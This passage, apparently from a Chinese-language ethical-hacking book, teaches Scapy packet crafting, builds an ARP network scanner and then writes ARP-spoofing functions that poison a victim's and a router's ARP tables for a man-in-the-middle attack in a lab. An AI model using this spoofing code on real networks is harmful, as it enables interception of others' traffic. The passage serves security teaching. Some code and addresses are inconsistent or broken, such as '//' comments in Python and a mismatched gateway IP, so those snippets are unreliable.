  \n- 网络简介\n- TCP/IP 中的数据封装\n- Scapy 简介\n- ARP 简介\n- 基于 ARP 的 Scapy 网络扫描器\n\n### 网络简介\n\
  \n在第 3 章《侦察和信息收集》中，我们从非常高的角度学习了网络的基础知识。我们了解了网络中存在的不同组件和设备，以及每个组件的作用。在本节中，我们将更深入地了解在网络上传输的实际数据包和数据。\n\
  \n### 数字系统中的数据表示\n\n让我们首先了解你的计算机系统如何管理在网络上传输数据。计算机系统中数据的每个部分都由 **二进制逻辑电平** 定义。这些电平定义为\
  \ *低* 或 *高*。现代计算系统中存储的每张图像、文件、视频、语音记录或任何其他内容都由这些逻辑电平表示。在物理硬件中，这些电平映射为电压电平或开关状态。例如，在数字系统中，5\
  \ V 电压可能代表高逻辑，0 V 电压将代表低逻辑。你可能会想知道这些不同类型的数据是如何用逻辑电平表示的。让我们看看它是如何工作的。假设你想向朋友发送消息\
  \ Hello。为了简单起见，假设你的朋友在同一网络中。现在，我们假设底层通信是可行的。现在，为了发送这条 Hello 消息，我们需要将此消息转换为计算机可理解的形式。我们刚刚了解到计算机只理解低和高逻辑电平，所以我们必须将我们的消息\
  \ *编码* 为这些逻辑电平。现在，正如我们所见，Hello 包含五个字母，而我们只有两个逻辑电平，因此仅用一个 *实例* 的两个电平是不可能对完整消息进行编码的。这个实例称为\
  \ **位**。为了实现这种编码，开发了一种系统，称为 **美国信息交换标准代码（ASCII）**。使用这种编码方案，我们可以轻松表示英文字母以及一些其他符号和字母。英语字母表的每个字母都由称为\
  \ *字节* 的 8 位序列表示。为了表示我们的 Hello 消息中的字母 H，我们可以将其编码为以下位序列。H 在 ASCII 格式中为 01001000。该值在\
  \ ASCII 代码表中预定义；同样，其他字符也在相同格式中定义：\n\n- H = 01001000\n- e = 01000101\n- l = 01101100\n\
  - l = 01101100\n- o = 01101111\n\n现在我们有一个数据流，可以使用任何数字系统发送。请注意，这是对数据表示的非常简化的解释。实际系统还使用其他编码，例如\
  \ Unicode 和字节表示，以发送复杂数据。\n\n### 数据封装\n\n现在我们了解了数据表示，让我们将注意力转回我们最初的话题，即如何发送这些数据。我们已经了解了\
  \ TCP/IP 栈中的不同层以及它们如何用于发送数据。在前一节中，我们说我们想向本地网络中的某人发送 Hello 消息。让我们称此消息为我们的数据：\n\n\
  | H | e | l | l | o |\n|---|---|---|---|---|\n| 01001000 | 01000101 | 01101100 |\
  \ 01101100 | 01101111 |\n\n图 4.1 – 数据表示\n\n现在，为了使其成功到达另一台计算机，数据包必须知道其确切目的地，就像邮政投递系统的工作方式一样。你有一个国家、城市、邮政编码、街道和房屋号码。在数字系统中，你有\
  \ IP 地址、MAC 地址以及源端口和目的端口。假设你在浏览器应用程序中写下你的消息，你的朋友也在他们的浏览器中等待你的消息。为了成功地将消息发送到目标计算机中的完全相同的进程，IP\
  \ 协议将为你的消息添加一个新报头。\n\n从最上层开始，添加了 **应用层报头**。同样，应用层以下的每一层都会添加自己的报头。整体过程如图所示 4.2。图\
  \ 4.2 显示了数据在通过网络发送之前在 TCP/IP 栈中的封装方式。我们将学习这些段中的每一个包含什么内容以及这如何帮助数据包到达其目的地：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_86_0.png)\n\
  \n图 4.2 – 数据封装\n\n我们将在下一节中详细介绍这些段。\n\n### 数据包投递过程\n\n数据包投递过程取决于目标设备是否位于同一本地网络中。如果设备位于同一子网中，我们可以直接使用以太网地址发送数据。这些报头中包含大量信息，对于本书的范围而言，你不会关心其中大部分，我只会解释与本书相关的字段。\n\
  \n### IP 报头\n\n接下来，添加一个 IP 报头，如图 4.4 所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_88_0.png)\n\
  \n图 4.4 – IP 报头\n\n这里，我们感兴趣的字段是源 IP 和目的 IP。这定义了你的数据包将去往何处以及它来自何处。一旦添加了 IP 报头，它就被称为\
  \ IP 数据报。\n\n### 以太网报头\n\n以太网报头有助于数据在本地网络中导航。这里最重要的字段是源 MAC 地址和目的 MAC 地址。顾名思义，源\
  \ MAC 地址将是你的 MAC 地址，目的地将是本地网络中接收者的 MAC 地址：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_88_1.png)\n\
  \n图 4.5 – 以太网报头\n\n一旦添加了以太网报头，它现在就被称为 *以太网帧*。我们已经了解了在网络上传输的数据包中最重要的字段。我们还了解了数据如何被封装以及它使用哪些字段在网络上传输。在下一节中，我们将学习如何使用我们刚刚学到的信息创建我们的网络扫描器。\n\
  \n### Scapy 简介\n\n为了创建网络扫描器，我们将使用一个名为 Scapy 的 Python 网络库。该库设计用于发送、嗅探、拆解和编辑网络数据包。Scapy\
  \ 是一个非常强大的网络数据包操作工具。要了解有关该工具的更多信息，你可以访问以下链接：https://scapy.readthedocs.io/en/latest/introduction.html。\n\
  \n### 安装 Scapy\n\n要安装 Scapy，首先打开终端。让我们先了解一些事情。在 Linux 中，有两种用户权限，用户和 root，并且两个用户的环境不同。系统级命令需要更高的权限。为了发送和接收数据包，我们需要将\
  \ Scapy 安装为 root 用户以及普通用户。我们将以普通用户身份编写程序，并在运行时以 root 身份运行它，因为在 Linux 中发送数据包需要更高的权限（你可以将其视为\
  \ Windows 中的 *以管理员身份运行* 等效项）。你很快就会明白我的意思。要以 root 用户身份安装 Scapy，请输入以下命令：\n\n```\n\
  sudo pip3 install scapy\n```\n\n这将以管理员权限安装 Scapy。完成后，打开你的 Visual Studio Code 并为新项目创建一个新文件夹。我们将此文件夹命名为\
  \ `example2-introduction-scapy`。\n\n请注意，如果你遇到一些问题，你将需要使用以下命令更新系统的 Python：\n\n```\n\
  sudo apt-get update && sudo apt-get upgrade && sudo apt-get install python3-virtualenv\
  \ -y\n```\n\n现在，我们将为此特定项目创建一个新的虚拟环境。要创建新的虚拟环境，请导航到刚刚创建的文件夹目录并输入以下命令：\n\n```\npython3\
  \ -m venv venv\n```\n\n\n现在，如果一切都操作正确，你将看到一个名为 venv 的文件夹被创建。\n\n接下来，通过运行以下命令激活虚拟环境：\n\
  \n```\nsource venv/bin/activate\n```\n\n现在，你的虚拟环境应该已激活。激活后，你可以通过输入以下命令查看环境中已安装的软件包：\n\
  \n```\npip freeze\n```\n\n如果你在环境中已安装了一些软件包，它们将被列出；否则，你将看不到任何内容。现在，要安装 Scapy，编写以下命令：\n\
  \n```\npip3 install scapy\n```\n\n这需要一些时间来安装。完成后，你可以再次编写 pip freeze 命令来查看已安装的软件包：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_90_0.png)\n\n在本节中，我们学习了如何在虚拟环境中安装 Scapy\
  \ 以及如何查看其是否已正确安装。请注意，Scapy 的某些功能要求程序以更高权限运行，否则它们将无法工作。在下一节中，我们将了解有关 Scapy 的更多使用方法以及如何使用\
  \ Scapy 操作网络数据包。\n\n## 理解 Scapy 的工作原理\n\n在本部分，我们将学习 Scapy 的工作原理以及如何使用它来创建自己的网络操作工具。让我们创建一个名为\
  \ main.py 的新文件并打开它。打开文件后，我们可以在文件中导入任何 Scapy 模块。在本节中，我们将创建一个向任何网站发送的小型 ping 请求。Ping\
  \ 请求通常用于测试设备是否可用。Ping 请求（也称为回显请求）使用底层 ICMP 应用层协议。要在程序中导入一个包，编写以下代码：\n\n```\nfrom\
  \ scapy.all import scapy\n```\n\n> **重要提示**\n> 请注意，在最新版本的 Kali Linux 中，一些依赖项已更改，你可能会看到与缺少文件相关的错误。要纠正此问题，你可以编写以下命令：\n\
  > `cd /usr/lib/x86_64-linux-gnu/sudo ln -s -f libc.a liblibc.a`\n\n要发送 ping 请求，你需要创建一个\
  \ IP 层数据包，这将帮助你设置源和目标 IP 地址。要导入 IP 层，我们可以编写以下命令：\n\n```\nfrom scapy.all import IP\n\
  ```\n\n最后，要发送和接收数据包，我们可以使用一个名为 sr 的函数。要导入此函数，使用以下命令：\n\n```\nfrom scapy.all import\
  \ sr\n```\n\n此 IP 会根据你的系统而有所不同。你可以使用 sudo ifconfig 命令找到此 IP。\n\n然后，我们将定义我们的源和目标\
  \ IP：\n\n```\nsrc_ip = \"192.168.74.128\"\n```\n\n然后，我们将定义目标 IP。我们希望向 google.com\
  \ 服务器创建一个 ping 请求。你可以手动编写此服务器的 IP 地址，你可以通过在终端中编写 ping www.google.com 来找到它，或者你可以直接给出\
  \ www.google.com。\n\nScapy 将自动转换此地址：\n\n```\ndest_ip = \"www.google.com\"\n```\n\
  \n现在，我们将创建一个 ip_layer 数据包并打印出来以查看其包含的内容：\n\n```\nfrom scapy.all import ICMP\nfrom\
  \ scapy.all import IP\nfrom scapy.all import sr\n\nif __name__ == \"__main__\":\n\
  \    src_ip = \"192.168.74.128\"\n```\n\n接下来，要发送 ICMP 请求，你可以调用类来创建实例，如下所示：\n\n```\n\
  icmp_req = ICMP(id=100)\n```\n\nid=100 有助于协议追踪数据包。要查看此请求中存在哪些字段，你可以编写以下命令：\n\n```\n\
  print(icmp_req.show())\n```\n\n结果将看起来像这样：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_93_0.png)\n\
  \n图 4.8 – ICMP 数据包内容\n\n从这里，你可以看到数据包类型是回显请求，用于测试连接可用性。\n\n根据我们之前的讨论，我们知道应用层位于 IP\
  \ 层之上，我们到目前为止已创建了两个层。现在，下一个目标是将这两个层组合成一个可以在网络上传送的单个数据包。为此，我们可以编写以下代码：\n\n```\npacket\
  \ = ip_layer / icmp_req\n```\n\n```\nprint(packet.show())\n```\n\n这将列出组合后的数据包。请注意\
  \ / 运算符。此运算符用于在 Scapy 中组合不同的层。你从较低层开始并继续使用此 / 运算符添加新层。打印结果将显示数据包的结果，其中之前的层组合成一个：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_94_0.png)\n\n图 4.9 – 组合的层\n\n现在，我们的请求已准备好发送。要发送它，我们可以使用我们已导入的\
  \ sr1 方法：\n\n```\nresponse = sr1(packet, iface=\"eth0\")\nif response:\n    print(response.show())\n\
  ```\n\n响应将看起来像这样：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_95_0.png)\n\n图 4.10\
  \ – ICMP 回复\n\n你可以看到响应类型是 echo-reply，回复中的 src 字段是回复此 ping 请求的服务器的 IP 地址。\n\n现在你已经学会了如何使用\
  \ Python 制作和发送数据包。理论上，你可以用 Scapy 创建任何网络应用程序。\n\n前面提到的发送数据包的完整代码如下所示：\n\n```\nfrom\
  \ scapy.all import ICMP\nfrom scapy.all import IP\nfrom scapy.all import sr\n\n\
  if __name__ == \"__main__\":\n    src_ip = \"192.168.74.128\"\n    dest_ip = \"\
  www.google.com\"\n    ip_layer = IP(src = src_ip, dst = dest_ip)\n    icmp_req =\
  \ ICMP(id=100)\n```\n\n```\npacket = ip_layer / icmp_req\nresponse = sr(packet,\
  \ iface=\"eth0\")\n// to see available interfaces, write ifconfig command in\n//\
  \ terminal\nif response:\n    print(response.show())\n```\n\nScapy 的好处在于它允许你创建 raw_packets，这意味着即使是包含错误信息的数据包（畸形数据包）也可以创建，并且没有机制来检查数据包是否具有正确的值。你可以更改计算机上的\
  \ src ip 字段并放入其他数据包的值，在某些情况下，目标将无法知道哪个 PC 实际生成了这些数据包（空闲扫描）。这样，你就可以伪造数据包。\n\n所以，到目前为止，我们已经了解了\
  \ IP 堆栈和头部字段。我们还学习了如何安装 Scapy 并使用它来创建可以在网络上传送的原始数据包。现在，让我们看一下一些有用的函数，这将帮助我们更详细地了解\
  \ Scapy 的工作原理。\n\n如果你想了解 Scapy 中某个特定层的更多详细信息以及该层中可用的选项以进行修改，你可以使用 Scapy 中的 ls 函数。要导入此函数，你可以使用此命令：\n\
  \n```\nfrom scapy.all import ls, IP\n```\n\n要获取有关 ip_layer 的信息，我们可以像这样打印 ls：\n\n\
  ```\ndest_ip = \"www.google.com\"\nip_layer = IP(dst = dest_ip)\nprint(ls(ip_layer))\n\
  ```\n\n在下一个屏幕截图中，你将看到之前提到的代码的执行。屏幕截图显示了 IP 数据包中的字段列表：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_97_0.png)\n\
  \n图 4.11 – ls 函数\n\n如果你想访问任何层的单个字段，你可以简单地使用点（.）运算符。例如，如果你想打印 ip_layer 中的 dst，你可以编写以下代码：\n\
  \n```\nip_layer = IP(dst = dest_ip)\nprint(\"Destination = \", ip_layer.dst)\n```\n\
  \n结果如下：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_97_1.png)\n\n图 4.12 – 访问单个字段\n\
  \n如果你想查看层的快速摘要，你可以在层上调用 summary 方法：\n\n```\nprint(\"Summary = \", ip_layer.summary())\n\
  ```\n\n摘要结果将如下所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_97_2.png)\n\n图 4.13\
  \ – 层摘要\n\n所以现在，我们已经熟悉了 Scapy 及其工作原理。我们学习了如何创建基本数据包以及如何操作这些数据包。在下一节中，我们将转向如何使用 Scapy\
  \ 进行信息收集。\n\n## 使用 Scapy 的网络扫描器\n\n在本节中，我们将创建一个简单的扫描器，扫描我们本地网络中的主机并查找它们的 MAC 地址。为了创建扫描器，我们首先需要了解地址解析协议（ARP）是什么以及它如何用于创建网络扫描器。\n\
  \n### 地址解析协议\n\nARP 在最简单的形式上是一种转换工具，帮助我们将 IP 地址转换为 MAC 地址。每当一台设备需要在同一本地网络内与另一台设备通信时，它需要该设备的\
  \ MAC 地址。IP 地址不用于本地通信。\n\n假设设备 A 想要与本地网络中的设备 B 通信。为了找到设备 B 的 MAC 地址，计算机 A 首先会在其内部维护的一个名为\
  \ ARP 缓存的列表中查找，以查看计算机 B 的 IP 地址是否已映射到其表中的物理 MAC 地址。这也称为 ARP 表。你可以通过输入 arp -a 命令来检查你的\
  \ PC 上的 ARP 表。\n\n以下是 Kali Linux 上运行 arp -a 命令的结果：\n\n```\n(venv) —(kali@kali)-[~/packt-book-code/example2-introduction-scapy]\n\
  └$ arp -a\n? (192.168.74.2) at 00:50:56:ff:74:8b [ether] on eth0\n? (192.168.74.254)\
  \ at 00:50:56:f8:e6:bc [ether] on eth0\n```\n\n图 4.14 – ARP 表\n\n你可以看到它列出了 IP 地址和与之关联的\
  \ MAC 地址。你也可以在 Windows 中使用相同的命令。\n\n如果请求的设备的相应 MAC 地址在本地不存在，设备 A 将向整个网络发送广播请求，询问哪个设备具有相应的\
  \ IP。在我们的例子中，它将是设备 B。那些不是设备 B 的设备将忽略此请求，而设备 B 将回复设备 B 的相应 MAC 地址。这样，设备 A 将得知设备 B\
  \ 的 MAC 地址。一旦两个设备相互得知，它们之间的通信就可以进行。一旦设备 A 得到设备 B 的 MAC 地址，它将更新其 ARP 表。图 4.15 显示了源设备如何生成\
  \ ARP 请求以及目标设备如何使用正确的 MAC 地址进行回复：\n\n\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_99_0.png)\n\
  \nFigure 4.15 – ARP 请求\n\n现在我们了解了 ARP 的工作原理，我们就可以开始使用 Scapy 创建自己的 ARP 扫描器来查找这些设备的\
  \ MAC 地址。你可能会想知道为什么我们需要 ARP 扫描器。好吧，了解设备的 MAC 地址可以帮助我们执行中间人攻击，我们将在第 5 章《中间人攻击》中执行此操作。\n\
  \n## 使用 Scapy 的 ARP 扫描器\n\nARP 协议工作在以太网层，因此使用 Scapy，我们将导入以太网层。让我们导入我们将使用的层和函数：\n\
  \n```\nfrom scapy.all import Ether, ARP, srp\n```\n\n如果 MAC 地址的所有位都设置为 1，则意味着该数据包是广播，并且应该发送到网络中的每个设备。Scapy\
  \ 使用十六进制表示法，因此我们将创建以下变量来表示广播地址：\n\n```\nbroadcast = \"FF:FF:FF:FF:FF:FF\"\n```\n\
  \n然后，我们可以创建一个以太网层数据包并将目标设置为广播。\n\n我们还需要定义要扫描的 IP 范围。在我的例子中，我想扫描我的本地网络：\n\n```\n\
  ip_range = \"192.168.74.1/24\"\n```\n\n完整的代码看起来像这样：\n\n```\nfrom scapy.all import\
  \ Ether, ARP, srp\n\nif __name__ == \"__main__\":\n    broadcast = \"FF:FF:FF:FF:FF:FF\"\
  \n    ether_layer = Ether(dst = broadcast)\n    ip_range = \"192.168.74.1/24\"\n\
  \    arp_layer = ARP(pdst = ip_range)\n\n    packet = ether_layer / arp_layer\n\n\
  \    ans, unans = srp(packet, iface = \"eth0\", timeout=2)\n\n    for snd, rcv in\
  \ ans:\n        ip = rcv[ARP].psrc\n        mac = rcv[Ether].src\n        print(\"\
  IP = \", ip, \" MAC = \", mac)\n```\n\n程序的输出如下所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_101_0.png)\n\
  \nFigure 4.16 – ARP 扫描结果\n\n现在你可以看到网络中所有可用设备的 MAC 和 IP 地址。第三个，IP = 192.168.72.129\
  \ 是我的 Windows 机器，我将在后面的章节中将其用作受害者/目标机器。为了验证我们在程序中获得的结果是否正确，我们可以从网络连接设置中手动检查这些字段：\n\
  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_102_0.png)\n\nFigure 4.17 – 受害者的 IP 配置\n\
  \n在这里，你可以看到我们在扫描中获得的结果与这些值相匹配。MAC 地址也请看一下。其他设备也可以看到。\n\n192.168.74.254 代表 DHCP 服务器。DHCP\
  \ 服务器在设备配置为自动 IP 分配时为网络中的设备分配 IP 地址。192.168.72.2 代表网络中的默认网关。\n\n## 总结\n\n在本章中，我们学习了数据如何在网络上从一个设备发送到另一个设备。我们学习了数据如何在\
  \ TCP/IP 协议中封装，以及每个报头中添加了哪些字段。接下来，我们学习了一个非常重要的网络操纵和数据包制作工具，称为 Scapy。我们还学习了如何使用 Scapy\
  \ 制作数据包以及这些数据包如何通过网络发送。然后，我们学习了 ARP 协议，最后，我们创建了一个 ARP 扫描器来获取网络中活动设备的 IP 和 mac 地址。在下一章中，我们将学习如何使用此扫描器创建中间人攻击以拦截受害者机器的网络流量。\n"
- "# 5\n中间人攻击\n\n在上一章中，我们学习了网络扫描。网络扫描是信息收集的一部分，允许用户查找本地网络中的主机。在本章中，我们将学习如何利用这些信息来攻击本地网络上的受害者。我们将在本章中涵盖以下主题：\n\
  \n- 为什么我们需要 ARP？\n- 构建 ARP 欺骗程序\n- 监控流量\n- 加密流量\n- 手动恢复 ARP 表\n- 解密网络流量\n\n## 为什么我们需要\
  \ ARP？\n\n在之前的章节中，我们提到过地址解析协议是什么。在本章中，我们将更深入地研究它。在本地网络中，通信在设备之间使用 MAC 地址而不是 IP 地址进行。这些也称为\
  \ *链路层地址*。ARP 是一个请求响应协议，这意味着一个设备请求服务，另一个设备对该请求做出响应。假设网络中存在两个设备，没有外部互联网连接。为了让它们相互通信，它们需要依赖于底层协议，即所谓的第\
  \ 2 层协议。我们已经简要学习过 ARP 表。通过使用 ARP 表，设备可以通过使用其 IP 和 MAC 地址的映射来维护网络上所有活动设备的列表。这种 ARP\
  \ 表技术相当古老，并且是在没有考虑安全性的情况下设计的。它有一些固有的弱点可以被利用，我们将在后面的部分看到。\n\n## ARP 欺骗\n\n在学习 ARP\
  \ 欺骗之前，让我们再看看 ARP。ARP 基本上是安装在你的 PC 上的一个程序，它会自动执行与 ARP 相关的所有任务，而无需用户输入。要从机器获取地址，它会在其请求中将\
  \ FF:FF:FF:FF:FF:FF 作为广播地址放置。它这样做是为了将请求发送到网络中的所有活动设备，同时询问相关问题。随后，目标设备会用适当的答案回复。让我们看一下下面的图表，了解\
  \ ARP 请求和响应是如何生成的：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_106_0.png)\n\nFigure\
  \ 5.1 – ARP 请求和响应\n\n设备 A 发送请求，设备 B 用其 MAC 地址回复答案。看起来很简单，对吧？实际上，该协议存在设计缺陷。当设备 B\
  \ 收到请求时，它无法知道请求设备提供的信息是否正确。通过这种方式，你可以轻松地欺骗数据包。稍后会详细介绍。\n\n让我们考虑一个简单的场景：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_107_0.png)\n\
  \nFigure 5.2 – 互联网通信\n\n假设设备 A 想与基于互联网的设备通信。正如我们所知，它不能直接自行连接到互联网——它必须通过网关。设备的相应\
  \ IP 和 MAC 地址显示在下面的图像中。设备 A 和网关维护自己的 ARP 表。为了让设备 A 向外部服务器发送请求，它将在自己的 ARP 表中查找网关设备的\
  \ MAC 地址。一旦成功找到设备的 MAC 地址，它将向网关发送请求。这在前面的图表中用步骤 1 表示。如果本地网络中只有一个设备，设备 A 中的 ARP 表将如下所示：\n\
  \n| Number | IP address | MAC address |\n|---|---|---|\n| 1 | 192.168.1.1 | 12:34:53:65:63:22\
  \ |\n\nFigure 5.3 – 设备 A 中的 ARP 表\n\n现在，由于网关是本地网络和互联网之间的桥梁，我将为数据包找出外部 IP 地址。然后，使用其自己的外部或公共\
  \ IP 地址，它将请求转发到位于 77.88.99.11 的服务器。这是步骤 2。服务器将处理请求并在步骤 3 中回复路由器。路由器将收到此回复并找出外部数据包应该去哪里。它是如何找出数据包应该去哪里？正如你可能猜到的那样，它将查看目标地址和目标端口。使用其自己的\
  \ ARP 表，它将看到相应的设备位于何处。路由器中的 ARP 表将如下所示：\n\n| Number | IP | MAC |\n| --- | --- |\
  \ --- |\n| 1 | 192.168.1.44 | 23:55:66:22:55:44 |\n\nFigure 5.4 – 路由器中的 ARP 表\n\n\
  在步骤 4 中，路由器将简单地将回复转发给预期的接收者。\n\n到目前为止，我们已经了解了正常的请求响应是如何工作的。现在，我们将添加一个额外的参与者，称为黑客/渗透测试人员。\n\
  \nARP 的工作方式如下。正如我们所知，设备不断地连接到网络和断开连接，因此 ARP 程序不会无限期地保留此 ARP 表。另一个原因是动态主机控制协议（DHCP）服务器会自动为网络中的设备分配\
  \ IP 地址。因此，当设备离线时，IP地址会再次可用，以便可以分配给新连接的设备。出于这个原因，网络中的设备会定期向网络中的其他设备发送 ARP 响应，让它们知道其当前的\
  \ IP 和 MAC 地址。这确保了所有设备都有 IP 和 MAC 地址的最新记录。现在，当设备收到 ARP 响应时，它会在没有任何身份验证或验证的情况下更新其\
  \ ARP 表。你能看到这里的问题吗？如果设备创建包含虚假信息的 ARP 响应并将其发送给受害者/目标机器，接收设备将使用虚假信息更新其 ARP 表，而不会验证数据的正确性。ARP\
  \ 协议的另一个弱点是，它允许我们接受响应，即使它没有发送请求。\n\n\n\n\n\n让我们看看当我们在网络中添加一个恶意行为者时会发生什么：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_109_0.png)\n\
  \n## 图 5.5 – 向网络中添加攻击者\n\n在这里，属于黑客的设备 B 将生成两个伪造的 ARP 响应——一个针对受害者，一个针对网关路由器。它将向设备\
  \ A 发送 arp 回复并假装成路由器。同样，它将向路由器发送回复并假装成设备 A。现在，设备 A 和路由器都将用这些新的伪造信息更新其 ARP 表。现在，如果设备\
  \ A 向外部服务器发出与之前相同类型的请求，请求将不会去往路由器，而是会去往攻击者。攻击者然后可以选择将请求转发给路由器。此时，路由器会认为请求来自设备 A，而实际上请求来自设备\
  \ B。设备 B 实际上是在拦截路由器与设备 A 之间的所有网络流量。还记得我们之前学过的 CIA 三要素吗？你能看出这里违反了哪条规则吗？这里的全部三条规则都可能被破坏，这取决于黑客打算如何使用这些信息。现在，黑客有效地成为了路由器与设备\
  \ A 之间的中间人。这就是为什么它被称为中间人攻击（MITM）。这种漏洞非常知名，被称为 ARP 欺骗。\n\n> **重要提示**\n> \n> ARP 表会在一段时间后重置，因此只发送一个数据包进行欺骗是行不通的。为了能够在更长时间内成功欺骗，你需要不断发送这些伪造的制造数据包，以便\
  \ ARP 表不会在一定时间后重置。\n\n## 构建 ARP 欺骗程序\n\n在本节中，我们将学习如何构建一个 ARP 欺骗程序。在继续之前，让我们再次查看\
  \ Kali 以及 Windows 中的 ARP 表。Kali Linux 中的 ARP 表如下：\n\n```\n(venv) —(kali㉿kali)-[~/packet-book-code/example2-introduction-scapy]\n\
  └─$ arp -a\n? (192.168.74.2) at 00:50:56:ff:74:8b [ether] on eth0\n? (192.168.74.254)\
  \ at 00:50:56:f8:e6:bc [ether] on eth0\n? (192.168.74.129) at 00:0c:29:be:47:14\
  \ [ether] on eth0\n```\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_110_0.png)\n\n\
  Windows 中的 ARP 表如下所示。请查看突出显示的字段：\n\n```\nC:\\Users\\fahad-sarwar>arp -a\n\nInterface:\
  \ 192.168.74.129 --- 0xc\n  Internet Address      Physical Address      Type\n \
  \ 192.168.74.2          00-50-56-ff-74-8b     dynamic\n  192.168.74.128        00-0c-29-90-79-02\
  \     dynamic\n  192.168.74.255        ff-ff-ff-ff-ff-ff     static\n  224.0.0.22\
  \            01-00-5e-00-00-16     static\n  224.0.0.251           01-00-5e-00-00-fb\
  \     static\n  224.0.0.252           01-00-5e-00-00-fc     static\n  239.255.255.250\
  \       01-00-5e-7f-ff-fa     static\n  255.255.255.255       ff-ff-ff-ff-ff-ff\
  \     static\n```\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_110_1.png)\n\n正如你所见，它们为位于\
  \ 192.168.74.2 的路由器提供了正确的 MAC 地址。Kali 位于 192.168.74.128，而 Windows 10 位于 192.168.74.129。\n\
  \n为了欺骗这些设备，我们将逐步解决这个问题。首先，我们将处理用路由器的 MAC 地址欺骗受害者机器。\n\n## Arp 欺骗项目\n\n在 Kali Linux\
  \ 中打开 VS Code 并创建一个名为 ARP spoof 的新项目。按照第 2 章《入门 – 设置实验环境》所示安装虚拟环境。一旦虚拟环境安装完成，通过编写以下命令启用虚拟环境：\n\
  \n```\nsource venv/bin/activate\n```\n\n这将激活新的虚拟环境。在此环境中安装 Scapy 模块并创建一个名为 main.py\
  \ 的新文件。\n\n为了在一行中导入所有 scapy 模块，而无需分别显式导入每一个，你可以编写以下行：\n\n```\nfrom scapy.all import\
  \ *\n```\n\n* 表示我们想要导入 scapy 中存在的所有模块。正如我们在上一节中所学到的，要进行欺骗，我们必须创建伪造的响应。首先，我们将创建一个\
  \ intended for the victim 的响应。为此，我们将创建一个 arp 数据包并查看其中可以设置哪些字段。要创建 ARP 数据包并查看其中存在的字段，我们可以编写以下代码：\n\
  \n```\narp_response = ARP()\nprint(arp_response.show())\n```\n\n此代码的输出如下所示：\n\n\
  ![](img/d31345bbfd15f63be2920f0de5fa30dc_111_0.png)\n\n图 5.8 – ARP 数据包字段\n\n我们感兴趣的字段从\
  \ op 开始。Op 代表操作或数据包类型。这是一个 who has 操作，这意味着它是一个 ARP 请求。但我们感兴趣的是创建 ARP 响应而不是请求。hwsrc\
  \ 是 Kali 机器的 MAC 地址，同样，psrc 是其 IP 地址。hwdst 和 pdst 尚未为此数据包设置。现在，我们将对该数据包进行以下修改以欺骗受害者：\n\
  \n- 将 op 改为 2，表示这是一个响应 ARP 数据包，而不是请求。注意，默认情况下此值为 1，表示它对应于 who-has 操作。\n- 更改 psrc\
  \ 地址字段，使其等于路由器的 IP 地址值。由于我们的路由器位于 192.168.72.2，我们将此字段设置为此值。\n- 最后，我们将 pdst 设置为受害者机器的\
  \ ip 地址，即 192.168.74.129。我们还将设置 hwdst 地址，即受害者的 MAC 地址。\n\n要查看 Windows 机器的 MAC 地址，你可以在命令提示符中编写以下命令，或使用我们在上一章中创建的网络扫描器：\n\
  \n```\nIpconfig /all\n```\n\n一旦你获得了必要的信息，请继续在 Python 中进行以下更改：\n\n```\narp_response.op\
  \ = 2\narp_response.pdst = \"192.168.74.129\" // windows IP\narp_response.hwdst\
  \ = \"00:0C:29:BE:47:14\"      // windows mac\narp_response.hwsrc = \"00:0c:29:90:79:02\"\
  \      // kali mac\narp_response.psrc = \"192.168.74.2\"   // fake field value\n\
  ```\n\n只有最后一个字段是伪造的；我们将从 192.168.74.128 发送它，同时假装在 192.168.74.2。一旦所有字段都已设置，你可以打印它们以查看它们是否已正确定义：\n\
  \n```\nprint(arp_response.show())\n```\n\n以下屏幕截图显示了根据我们之前编写的代码进行的欺骗数据包：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_113_0.png)\n\
  \n图 5.9 – 欺骗的 ARP 数据包\n\n在这里，你可以看到 op 字段现在是响应而不是请求。字段值现在是 is-at。同样，psrc 字段假装是路由器的\
  \ IP 而不是 Kali。请注意，我们还没有发送数据包。要发送此数据包，我们可以简单地使用 send 函数：\n\n```\nsend(arp_response)\n\
  ```\n\n现在，如果你运行此程序并在 arp 表重置之前迅速转到 Windows 机器，你会看到 Windows 机器的 arp 表已被污染，其 arp 表条目显示了\
  \ 192.168.72.2 网关的错误 MAC 地址。不是指向实际网关，它现在指向 Kali 的 MAC 地址：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_113_1.png)\n\
  \n图 5.10 – Windows 中被污染的 ARP 表\n\n将其与图 5.6 中 192.168.74.2 的值进行比较。在这里，你可以看到此新表中物理地址的值已被修改。请注意，如果你花费太长时间查看此值，它将自动重置。我们将在稍后学习如何防止它在更长的欺骗期间自动重置。\n\
  \n现在，让我们创建一个函数，以便我们可以轻松调用它：\n\n```\ndef spoof_victim():\n    arp_response = ARP()\n\
  \    arp_response.op = 2\n    arp_response.pdst = \"192.168.74.129\"\n    arp_response.hwdst\
  \ = \"00:0C:29:BE:47:14\"\n    arp_response.hwsrc = \"00:0c:29:90:79:02\"\n    arp_response.psrc\
  \ = \"192.168.74.2\"\n    send(arp_response)\n```\n\n我们还将创建一个类似的函数来欺骗路由器：\n\n```\n\
  def spoof_router():\n    arp_response = ARP()\n    arp_response.op = 2\n    arp_response.pdst\
  \ = \"192.168.74.2\" // router's IP\n    arp_response.hwdst = \"00:50:56:ff:74:8b\"\
  \ // router's mac\n    arp_response.hwsrc = \"00:0c:29:90:79:02\" // kali's mac\n\
  \    arp_response.psrc = \"192.168.74.129\" // fake pretending to be device A.\n\
  \    send(arp_response)\n```\n\n在此函数中，我们更改了 pdst、hwdst 和 psrc 的值。\n\n完整的程序如下：\n\n\
